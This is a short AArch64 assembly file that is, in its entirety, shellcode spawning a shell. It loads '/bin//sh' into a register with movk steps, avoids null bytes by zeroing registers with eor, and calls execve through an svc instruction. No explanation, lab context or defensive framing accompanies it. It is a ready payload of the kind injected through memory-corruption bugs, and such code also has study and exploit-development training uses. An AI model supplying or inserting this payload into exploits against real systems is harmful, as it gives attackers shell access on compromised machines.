.section .text
.global _start

_start:

    // execve("/bin//sh", NULL, NULL)

    // movq x1, #0x68732f2f6e69622f "/bin//sh"
    movk x1, #0x622f
    movk x1, #0x6e69, lsl #0x10
    movk x1, #0x2f2f, lsl #0x20
    movk x1, #0x6873, lsl #0x30

    eor x2, xzr, xzr
    stp x1, x2, [sp], #0x40
    eor x1, xzr, xzr
    
    sub x0, sp, #0x40

    mov x8, #0xdd // SYS_execve

    svc #0x1337
